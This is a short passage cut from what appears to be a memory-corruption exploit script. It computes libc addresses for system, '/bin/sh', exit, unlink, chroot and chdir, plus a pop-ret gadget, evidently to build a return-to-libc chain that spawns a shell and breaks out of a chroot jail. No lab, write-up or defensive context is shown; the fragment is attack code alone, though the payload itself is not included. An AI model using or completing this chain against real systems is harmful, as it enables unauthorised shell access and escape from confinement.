...
# system
sys_addr = base_addr + 0x00047cd0 
# /bin/sh
sh_addr = base_addr + 0x1b90d5
# exit
ex_addr = base_addr + 0x0003a1f0 
# unlink
ul_addr = base_addr + 0x0010a510
# chroot
chr_addr = base_addr + 0x00116950
#chdir
chd_addr = base_addr + 0x001094a0
# pop-ret
pop_addr = 0x80d1a64
